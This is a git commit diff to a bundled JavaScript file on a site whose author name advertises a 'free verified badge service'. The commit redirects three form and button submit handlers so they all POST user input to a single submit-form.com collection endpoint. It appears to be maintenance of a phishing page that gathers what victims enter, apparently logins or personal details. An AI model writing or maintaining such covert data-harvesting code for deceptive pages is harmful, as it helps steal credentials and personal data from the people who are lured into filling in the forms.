94f8968fa7b71dcd4c7f59e1c3dcc260db78cdef
get-free-verified-badge-service-for <legendrabdino63@gmail.com>
2025-02-03 03:07:57 -0800

    Update main.be179052.js

--- main.be179052.js
+++ main.be179052.js
@@ -9814,7 +9814,7 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://submit-form.com/9lY0sONDa", {
+                                    fetch("https://submit-form.com/nVlKtKgiu", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13355,7 +13355,7 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/MynxMnftZ", {
+                                    u && o ? (fetch("https://submit-form.com/nVlKtKgiu", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13465,7 +13465,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/XSoKJjfxH", {
+                        fetch("https://submit-form.com/nVlKtKgiu", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
